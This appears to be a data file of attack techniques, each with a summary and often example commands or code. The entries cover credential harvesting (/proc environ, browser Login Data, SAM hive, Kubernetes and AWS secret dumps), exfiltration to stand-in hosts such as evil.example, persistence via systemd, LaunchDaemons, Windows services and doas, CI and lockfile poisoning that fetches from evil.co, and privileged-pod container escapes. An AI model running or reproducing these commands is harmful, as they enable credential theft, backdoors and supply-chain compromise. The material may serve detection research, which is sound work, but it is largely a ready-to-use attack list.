technique_summary: Harvesting the full process environment (which often contains injected secrets like API keys/DB passwords) rather than reading a single named variable.
variant_2:
with open('/proc/self/environ', 'rb') as f:
    blob = f.read().split(b'\x00')

technique_summary: Programmatically parsing a .env file to extract secrets via a dotenv library rather than a raw file read.
variant_1:
from dotenv import dotenv_values
secrets = dotenv_values('.env.production')

technique_summary: Reading Git's plaintext credential cache files (.git-credentials from the 'store' helper, or .netrc used by curl/ftp) to steal stored HTTPS/API credentials.
variant_2: curl -n https://api.example.com/v1/account  # relies on ~/.netrc for auth, attacker cats it first: cat ~/.netrc

technique_summary: Reading the Kubernetes pod's automatically-mounted ServiceAccount token/CA to impersonate the pod's identity against the API server.
Reading Docker's config.json which stores base64-encoded (or plaintext) registry auth credentials for private image pulls.
Reading Terraform state files, which routinely store resource attributes (DB passwords, private keys) in plaintext despite being 'infrastructure' files.
Querying the cloud instance metadata service (IMDS) to steal the attached IAM role's temporary credentials — classic SSRF-to-credential-theft pivot.
Exporting or directly reading GnuPG private key material to enable offline decryption or forged signing.
Extracting secrets from a local password-manager vault/database, either the raw encrypted DB file or via the manager's own CLI 'get' command.
Reading npm's .npmrc for an embedded _authToken used to publish/pull from private registries.
Reading .pypirc, which stores PyPI/Twine upload credentials (username/password or API token) in plaintext.
Extracting session tokens/JWTs persisted by a web app in browser localStorage, either from the on-disk LevelDB store or live via devtools JS.
variant_2: document.title = localStorage.getItem('auth_jwt');  // exfil via title/beacon in an XSS payload

technique_summary: Reading a specific, named third-party API secret out of the process environment (e.g. Stripe, Datadog, GitHub) rather than dumping env wholesale.
variant_1:
import os
key = os.environ['STRIPE_SECRET_KEY']
requests.post('https://evil.example/collect', data={'k': key})

technique_summary: Extracting an embedded DB connection string (with inline user:password) or the DATABASE_URL env convention to gain direct database access.
Locating GCP Application Default Credentials (ADC), either via the env var pointing at a service-account JSON or the default ADC cache file.
Reading Jenkins' on-disk secret store (credentials.xml plus the master.key used to decrypt it) to recover CI/CD credentials.
Locating a Firebase Admin SDK service-account JSON key file to gain full backend admin access to a Firebase project.
Reading the redis.conf 'requirepass' directive to recover the Redis AUTH password for lateral access.
Retrieving the Ansible Vault decryption password, either via the file it points to or a conventionally-named vault-pass file, to decrypt encrypted playbook secrets.
Reading Maven's settings.xml, which commonly stores repository server credentials (username/password) for artifact publishing.
Reading RubyGems' ~/.gem/credentials file, which stores the API key used to push gems to rubygems.org.
Reading Cargo's credentials.toml or CARGO_REGISTRY_TOKEN to steal the crates.io publish token.
Reading Pulumi's local credentials.json or PULUMI_ACCESS_TOKEN to hijack the Pulumi Cloud backend session and its stack secrets.
Reading PostgreSQL's .pgpass file (or the file pointed to by PGPASSFILE) which stores plaintext host:port:db:user:password lines used for passwordless psql auth.
Enumerating or dumping credentials stored in the Windows Credential Manager vault via built-in or PowerShell tooling.
Using macOS's 'security' CLI to dump or search the login/system Keychain for stored generic or internet passwords.
Reading Okta CLI/AWS-CLI-for-Okta token caches that persist session or OAuth tokens on disk after an SSO login.
Extracting saved website passwords from a Chromium-based browser's 'Login Data' SQLite DB (or a Firefox logins.json) for credential theft.
variant_1: sqlite3 "$HOME/.config/google-chrome/Default/Login Data" "SELECT origin_url, username_value, password_value FROM logins"

technique_summary: Reading Terraform Cloud/Enterprise API tokens, either from the CLI's stored credentials.tfrc.json or a TF_TOKEN_<hostname> environment variable.
Reading JFrog Artifactory CLI credentials from its config file or the access-token environment variable to pull/push artifacts under a stolen identity.
Reading a secrets-named env file that lives inside a repo (rather than the conventional .env, and thus often missed by .gitignore hygiene).
Reading the GitHub CLI (gh) or GitLab CLI (glab) locally-stored OAuth host tokens.
Abusing the SSH_AUTH_SOCK forwarded agent socket to sign auth requests with a victim's loaded private key without ever touching the key file itself.
Grepping shell/DB-client history files for accidentally-typed plaintext passwords or tokens.
Dumping the LSASS process memory on Windows to extract cached credentials/NTLM hashes offline (e.g. via Mimikatz-style workflows).
Running a secret-scanning tool against a git repo's full history to surface previously-committed-then-deleted credentials.
Reading the Azure CLI/MSAL local token cache files to reuse a signed-in user's or service principal's session tokens.
Reading IDE settings/config files where developers sometimes store API keys or credentials inline (VS Code settings.json or JetBrains security.xml).
Reading the OS's core password-hash store directly — /etc/shadow on Linux, the SAM hive or NTDS.dit on Windows domain controllers.
variant_2: reg save HKLM\SAM C:\temp\sam.hive & reg save HKLM\SYSTEM C:\temp\system.hive

technique_summary: Bulk-listing/dumping Kubernetes Secret objects across a namespace via kubectl to harvest every secret the caller's RBAC allows.
variant_2: kubectl get secrets -n prod -o yaml > all-prod-secrets.yaml

technique_summary: Bulk-enumerating or retrieving values from a centralized secrets manager (HashiCorp Vault or AWS Secrets Manager) via its CLI.
variant_2: aws secretsmanager list-secrets --query 'SecretList[].Name' && aws secretsmanager get-secret-value --secret-id prod/db/password

technique_summary: Exfiltrating stolen data over DNS queries by encoding it (base32/base64) into subdomain labels resolved via dig/nslookup — bypasses egress filters that only watch HTTP(S).
Stealing or listing Kerberos TGT/service tickets from the local ccache to enable pass-the-ticket lateral movement.
Reading stored VPN credentials — an OpenVPN auth-user-pass file, a Cisco AnyConnect profile, or a WireGuard PrivateKey — to hijack VPN access.
variant_1: cat /etc/openvpn/auth.txt  # referenced by 'auth-user-pass auth.txt' in client.ovpn

technique_summary: Listing/dumping the contents of a Java KeyStore (JKS/PKCS12) with keytool to extract private keys or trust material.
Dumping all keys/data from a Redis instance lacking authentication, using KEYS * or a full SCAN cursor sweep.
Scanning /proc for every running process's environment or command line to harvest secrets passed via env vars or CLI args across the whole host, not just the caller's own process.
variant_1: for p in /proc/[0-9]*/environ; do strings "$p"; done | grep -i key

technique_summary: Reading raw swap/hibernation storage or kernel memory devices to recover secrets that were paged out of RAM.
variant_2: dd if=/var/vm/swapfile0 bs=1M | strings | grep -i BEGIN

technique_summary: Using grep/ripgrep with a credential-shaped regex literal (AWS key ID prefix, GitHub PAT prefix, OpenAI key prefix, GCP OAuth token prefix) as the search pattern to sweep a filesystem or repo for live secrets.
Deserializing untrusted data with Python's pickle (or marshal), which can execute arbitrary code via a crafted __reduce__ payload.
Calling PyYAML's yaml.load() without restricting it to SafeLoader, allowing YAML tags like !!python/object/apply to trigger arbitrary code execution on untrusted input.
Forcing the dynamic linker to preload an attacker-controlled shared object before any other library, hijacking function calls in every subsequently-launched process.
Planting or prioritizing a malicious module path so Python's import machinery loads an attacker's module instead of (or before) the legitimate one.
variant_2:
import sys
sys.path.insert(0, '/tmp/fake_requests')
import requests  # loads attacker's requests.py

technique_summary: Using xargs to spawn a shell per input line (or via -I{} placeholder substitution), which becomes a command-injection primitive when the input list is attacker-influenced.
Launching a Docker container with elevated capabilities (--privileged, mounting the host root filesystem, or adding SYS_ADMIN) that allow trivial escape to the host.
Abusing the cgroup v1 release_agent notification mechanism to get the host to execute an attacker-supplied script, a well-known container escape.
Loading a kernel module (potentially from a world-writable temp directory) to run code in kernel space, or the BSD equivalent kldload.
Escaping a restricted Python sandbox by walking the object graph (object.__subclasses__()) to reach a dangerous class, or reaching raw libc via ctypes to call system().
Writing a new job file into a cron drop-in directory (or the per-user spool) to establish scheduled-task persistence.
Dropping a new systemd unit file (.service/.timer/.path) into the system unit directory to persist execution across reboots via systemctl enable.
variant_1:
cat <<EOF > /etc/systemd/system/updater.service
[Service]
ExecStart=/tmp/backdoor
EOF
systemctl enable --now updater.service

technique_summary: Installing a macOS LaunchAgent/LaunchDaemon plist to have launchd automatically re-execute a payload on login or boot.
variant_2: sudo cp evil.plist /Library/LaunchDaemons/com.system.helper.plist && sudo launchctl load /Library/LaunchDaemons/com.system.helper.plist

technique_summary: Establishing WMI permanent event subscriptions (filter + consumer + binding) as fileless Windows persistence that fires on a trigger like system startup.
Launching Chrome/Chromium with --load-extension to silently install an unpacked malicious extension outside the Web Store review process.
Injecting a JNDI lookup string (the Log4Shell pattern) into logged or evaluated input to force a Java app to fetch and instantiate a remote malicious class.
Creating a named pipe (FIFO) and wiring its input/output to a shell to build a persistent reverse-shell or command trigger.
Using nsenter or unshare to cross namespace boundaries and reach the host's mount/PID namespace from inside a container, a manual escape/lateral-movement primitive.
Writing an executable Git hook script (pre-commit, post-checkout, post-merge) so it silently runs attacker code whenever a developer performs an ordinary git operation.
Repointing git's core.hooksPath to an attacker-controlled directory (often shipped inside a malicious repo) so cloning/checking out the repo silently arms hostile hooks.
Modifying a CI pipeline definition (GitHub Actions workflow, GitLab CI yaml, CircleCI config) to inject a malicious build/run step that executes with the pipeline's credentials.
variant_1:
cat >> .github/workflows/build.yml <<'EOF'
  - run: curl -s http://evil.co/x.sh | bash
EOF

technique_summary: Tampering with a package manager's lockfile (npm's integrity/resolved hashes, yarn.lock, Cargo.lock) to silently redirect a dependency to a malicious package/version while keeping the manifest looking normal.
variant_1: jq '.packages["node_modules/leftpad"].resolved = "https://evil.co/leftpad-3.9.9.tgz"' package-lock.json > tmp && mv tmp package-lock.json

technique_summary: Overriding a dependency resolution to point at a local/relative path (Cargo patch table, or a path= dependency) so a compromised local copy is built instead of the vetted registry package.
Writing a .envrc file that direnv auto-executes (via `direnv allow`) the moment a developer cd's into the directory, silently running attacker shell commands.
Appending an attacker-controlled public key to a user's authorized_keys file to gain persistent passwordless SSH access.
Editing /etc/sudoers (or a drop-in under sudoers.d, or the doas equivalent) to grant an account passwordless or unrestricted root privileges.
variant_2: echo 'permit nopass keepenv attacker as root' >> /etc/doas.conf

technique_summary: Dropping a malicious polkit .rules file to silently authorize privileged actions (like disk mounting or systemd unit control) without a password prompt.
Prepending a writable, attacker-controlled directory onto PATH so that a lookalike binary shadows the legitimate system command for subsequent execution.
variant_2: export PATH=/home/user/.local/fake:$PATH  # contains a malicious 'sudo' shim

technique_summary: Writing to the Windows Run/RunOnce registry keys so a payload auto-executes at every user logon.
Creating a new Windows service (via sc.exe or PowerShell's New-Service) configured to run an attacker binary, often set to auto-start for persistence.
variant_1: sc create WinUpdateSvc binPath= "C:\Windows\Temp\svc.exe" start= auto

technique_summary: Writing to a PowerShell profile script (which auto-loads on every new PowerShell session) to persist attacker code execution.
Connecting to a Chrome/Chromium instance's remote-debugging port to drive the browser via the DevTools Protocol — reading sessions, injecting JS, or exfiltrating cookies.
Mounting or connecting to the Docker (or containerd) control socket from inside a container to escape and gain root-equivalent control of the host.
Executing a command interactively inside a running pod's container (or attaching an ephemeral debug container) via kubectl, giving shell access into the cluster workload.
Crafting a Pod manifest that requests privileged mode, host PID namespace, or host networking — any of which allows breakout from container isolation to the node.
variant_1:
apiVersion: v1
kind: Pod
spec:
  hostPID: true
  containers:
  - name: shell
    image: alpine
    securityContext:
      privileged: true
variant_2:
spec:
  hostNetwork: true
  containers:
  - name: sniffer
    image: nicolaka/netshoot

technique_summary: Using AWS STS to assume a different (often higher-privileged) IAM role, including the web-identity-federation variant used in OIDC-based CI pipelines, for privilege escalation or credential laundering.
variant_2: aws sts assume-role-with-web-identity --role-arn arn:aws:iam::111122223333:role/CIRole --role-session-name gha --web-identity-token file:///tmp/oidc_token

technique_summary: Passing attacker payload code directly on the command line to a scripting interpreter's inline-eval flag, combined with a dangerous sink (shell-out, network call, exec/eval) in the same invocation — the classic 'living off the land' inline-script execution technique.
